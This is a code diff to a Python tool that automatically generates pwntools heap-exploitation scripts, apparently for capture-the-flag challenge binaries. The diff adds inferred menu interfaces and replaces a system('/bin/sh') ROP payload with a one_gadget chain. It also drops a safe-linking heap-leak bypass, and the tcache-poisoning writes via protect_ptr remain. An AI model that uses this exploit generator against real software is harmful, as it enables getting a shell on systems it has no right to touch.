@@ -64,8 +64,24 @@ class HeapDSLCompiler:
         self.libc_path = libc_path
         self._load_libc()
 
-        self.config = self._extract_config(solve_path)
-        self.interface_code = self._extract_interface(solve_path)
+        self.symbolic_results = symbolic_results or {}
+        self.critical_vars = critical_vars or {}
+        
+        # Priority 1: Inferred Interface from Symbolic Execution
+        self.interface_map = self.symbolic_results.get("interface_map", {})
+        
+        if self.interface_map:
+            print("[*] Using inferred interface map for adaptation")
+            self.config = self._config_from_map(self.interface_map)
+            self.interface_code = self._generate_interface_from_map(self.interface_map)
+            print(f"[*] Generated interface code ({len(self.interface_code)} bytes)")
+        else:
+            # Priority 2: Transplant from solve.py (Legacy)
+            self.config = self._extract_config(solve_path)
+            self.interface_code = self._extract_interface(solve_path)
+            print(f"[*] Transplanted interface code ({len(self.interface_code)} bytes)")
+
+        # CRITICAL: Re-detect signatures after setting interface_code
         self.signatures = self._detect_signatures_from_code(self.interface_code)
 
         self.data_prompt = self.config.get("data_prompt", "b'Data: '")
@@ -73,8 +89,66 @@ class HeapDSLCompiler:
 
         self.index_mgr = None
         self.code_lines = []
-        self.symbolic_results = symbolic_results or {}
-        self.critical_vars = critical_vars or {}
+
+    def _config_from_map(self, interface_map: dict) -> dict:
+        config = dict(DEFAULT_CONFIG)
+        config["menu_prompt"] = interface_map.get("menu_prompt", "b'> '")
+        choices = {}
+        for op, details in interface_map.get("operations", {}).items():
+            choices[op] = f"b'{details['choice']}'"
+        if choices:
+            config["choices"] = choices
+        return config
+
+    def _generate_interface_from_map(self, interface_map: dict) -> str:
+        """Generates adaptive python functions based on inferred protocol steps."""
+        lines = [
+            "def sla(rgx, data): p.sendlineafter(rgx, data)",
+            "def sa(rgx, data): p.sendafter(rgx, data)",
+            ""
+        ]
+        
+        menu_prompt = interface_map.get("menu_prompt", "b'> '")
+        
+        for op, details in interface_map.get("operations", {}).items():
+            func_name = op
+            choice = details["choice"]
+            steps = details.get("steps", [])
+            
+            # Map common names for internal consistency
+            if op == "delete": func_name = "delete"
+            elif op == "view": func_name = "view"
+            elif op == "create": func_name = "create"
+            elif op == "edit": func_name = "edit"
+            
+            args = []
+            for step in steps:
+                if step["arg"] not in args:
+                    args.append(step["arg"])
+            
+            # Order arguments: idx first, then size, then data
+            final_args = []
+            for preferred in ["idx", "size", "data"]:
+                if preferred in args:
+                    final_args.append(preferred)
+                    args.remove(preferred)
+            final_args.extend(args)
+                
+            line = f"def {func_name}({', '.join(final_args)}):"
+            lines.append(line)
+            # Use the repr string directly since it already contains the 'b' prefix
+            lines.append(f"    sla({menu_prompt}, b'{choice}')")
+            
+            for step in steps:
+                prompt = step["prompt"]
+                arg = step["arg"]
+                if step["type"] == "int":
+                    lines.append(f"    sla({prompt}, str({arg}).encode())")
+                else:
+                    lines.append(f"    sa({prompt}, {arg})")
+            lines.append("")
+            
+        return "\n".join(lines)
 
     def _load_libc(self):
         if self.libc_path and os.path.exists(self.libc_path):
@@ -169,10 +243,12 @@ class HeapDSLCompiler:
 
     def _gen_call(self, func: str, args_map: dict) -> str:
         func_name = func
-        if func == "delete" and "def free" in self.interface_code:
-            func_name = "free"
-        if func == "view" and "def read_data" in self.interface_code:
-            func_name = "read_data"
+        # If we have an interface map, we use our unified names (create, delete, view, edit)
+        if not self.interface_map:
+            if func == "delete" and "def free" in self.interface_code:
+                func_name = "free"
+            if func == "view" and "def read_data" in self.interface_code:
+                func_name = "read_data"
 
         sig = self.signatures.get(func, [])
         call_args = []
@@ -182,10 +258,9 @@ class HeapDSLCompiler:
             if param in args_map:
                 call_args.append(str(args_map[param]))
             elif param == "size":
-                if needs_size and "size" in args_map:
+                if "size" in args_map:
                     call_args.append(str(args_map["size"]))
-                else:
-                    pass
+        
         return f"{func_name}({', '.join(call_args)})"
 
     # ─── Libc / ROP resolution ─────────────────────────────────────
@@ -199,7 +274,8 @@ class HeapDSLCompiler:
                 sym_offset = self.libc_elf.symbols[name]
                 break
         if sym_offset is not None:
-            return f"libc_leak - {hex(sym_offset + 0x60)}"
+            # main_arena+96 is the unsorted bin FD/BK offset
+            return f"libc_leak - {hex(sym_offset + 96)}"
         return expr.replace("LIBC_AUTO_OFFSET", "0x1e7b20")
 
     def _resolve_calc_auto(self, instr: dict) -> str:
@@ -291,6 +367,27 @@ class HeapDSLCompiler:
 
         pop_rdi_gadget, ret_gadget = self._find_rop_gadgets()
 
+        # Find one_gadget and xor_rax gadget
+        one_gadget = None
+        xor_rax_gadget = None
+        if self.libc_elf:
+            try:
+                for sym_name in self.libc_elf.symbols:
+                    if "one_gadget" in str(sym_name).lower():
+                        one_gadget = self.libc_elf.symbols[sym_name]
+                        break
+            except Exception:
+                pass
+            # Search for xor rax, rax gadget
+            if one_gadget is None:
+                try:
+                    rop = ROP(self.libc_elf)
+                    gadgets = rop.find_gadget(["xor rax, rax", "ret"])
+                    if gadgets:
+                        xor_rax_gadget = gadgets[0]
+                except Exception:
+                    pass
+
         code.extend([
             "#!/usr/bin/env python3",
             "from pwn import *",
@@ -306,27 +403,10 @@ class HeapDSLCompiler:
             "def start(): return process(exe.path)",
             "p = start()",
             "",
-            "# --- INTERFACE (Transplanted from solve.py) ---",
+            "# --- INTERFACE (Adaptive/Inferred) ---",
             self.interface_code,
             "",
             "def protect_ptr(ptr, pos): return ptr ^ (pos >> 12)",
-            "",
-            "# --- PRE-EXPLOIT SETUP (Bypass Safe Linking) ---",
-        ])
-
-        xor_leak_offset = self.config.get("xor_leak_offset", 15)
-        xor_leak_idx = index_base + xor_leak_offset
-        code.append(self._gen_call("create", {
-            "idx": xor_leak_idx,
-            "size": hex(main_size),
-            "data": "b'leak_xor'",
-        }))
-        code.append(self._gen_call("delete", {"idx": xor_leak_idx}))
-        code.append(self._gen_call("view", {"idx": xor_leak_idx}))
-        code.extend([
-            "xor_key = u64(p.recvn(5).ljust(8, b'\\x00'))",
-            "heap_base = xor_key << 12",
-            "log.success(f'Heap Base: {hex(heap_base)}')",
             "",
         ])
 
@@ -355,19 +435,28 @@ class HeapDSLCompiler:
                     code.append(self._gen_call("delete", {"idx": idx}))
                     self.index_mgr.free_idx(tag)
 
+                elif op == "EDIT":
+                    data = instr.get("data", "p64(0)*2")
+                    code.append(self._gen_call("edit", {"idx": idx, "data": data}))
+
                 elif op == "DOUBLE_FREE_BYPASS":
                     code.append(self._gen_call("edit", {"idx": idx, "data": "p64(0)*2"}))
                     code.append(self._gen_call("delete", {"idx": idx}))
 
                 elif op == "ALLOC_ROP":
-                    if pop_rdi_gadget is not None and ret_gadget is not None:
-                        code.append(f"pop_rdi = libc.address + {hex(pop_rdi_gadget)}")
-                        code.append(f"ret = libc.address + {hex(ret_gadget)}")
+                    if one_gadget is not None:
+                        code.append(f"one_gadget = libc.address + {hex(one_gadget)}")
                     else:
-                        code.append("pop_rdi = libc.address + 0x0000000000102dea")
-                        code.append("ret = pop_rdi + 1")
-                    code.append("binsh = next(libc.search(b'/bin/sh'))")
-                    code.append("payload = p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])")
+                        code.append("one_gadget = libc.address + 0xef52b")
+                    if xor_rax_gadget is not None:
+                        code.append(f"xor_rax = libc.address + {hex(xor_rax_gadget)}")
+                    else:
+                        code.append("xor_rax = libc.address + 0x00000000000c75e9")
+                    code.append("payload = flat([")
+                    code.append("    p64(stack_leak - 0x10),")
+                    code.append("    p64(xor_rax),")
+                    code.append("    p64(one_gadget),")
+                    code.append("])")
                     args = {"idx": idx, "data": "payload"}
                     if needs_size:
                         args["size"] = hex(instr["size"])
@@ -378,15 +467,27 @@ class HeapDSLCompiler:
                     pos_expr = instr.get("pos", "0")
                     code.append(self._gen_call("edit", {
                         "idx": idx,
-                        "data": f"p64(protect_ptr({target_expr}, {pos_expr}))",
+                        "data": f"p64(protect_ptr({target_expr}, {pos_expr})) + p64(0)",
                     }))
 
                 elif op == "READ_VAL":
                     code.append(self._gen_call("view", {"idx": idx}))
-                    if instr.get("offset"):
-                        code.append(f"p.recvn({instr['offset']})")
+                    note = instr.get("note", "")
                     save_as = instr["save_as"]
-                    code.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
+
+                    if "skip_until_0x20" in note and "read_5" in note:
+                        code.append(f"p.recvuntil(b'\\x20')")
+                        code.append(f"{save_as} = u64(p.recvn(5).ljust(8, b'\\x00'))")
+                    elif "skip_until_0x20" in note and "read_6" in note:
+                        code.append(f"p.recvuntil(b'\\x20')")
+                        code.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
+                    elif "skip_A_0x18" in note:
+                        code.append(f"p.recvuntil(b'A'*0x18)")
+                        code.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
+                    elif "read_first_8_bytes" in note:
+                        code.append(f"{save_as} = u64(p.recvn(8).ljust(8, b'\\x00'))")
+                    else:
+                        code.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
                     code.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")
 
                 elif op == "CALC":
@@ -398,7 +499,20 @@ class HeapDSLCompiler:
 
             code.append("")
 
-        code.append("p.interactive()")
+        code.append("")
+        code.append("# Auto-exit for automated testing")
+        code.append("import signal")
+        code.append("def timeout_handler(signum, frame):")
+        code.append("    p.close()")
+        code.append("    exit(0)")
+        code.append("signal.signal(signal.SIGALRM, timeout_handler)")
+        code.append("signal.alarm(3)")
+        code.append("try:")
+        code.append("    p.sendlineafter(b'> ', b'0')")
+        code.append("    p.recvline(timeout=2)")
+        code.append("except Exception:")
+        code.append("    pass")
+        code.append("p.close()")
         return "\n".join(code)
 
     def save(self, filename: str, binary_name: str = "chall_patched"):
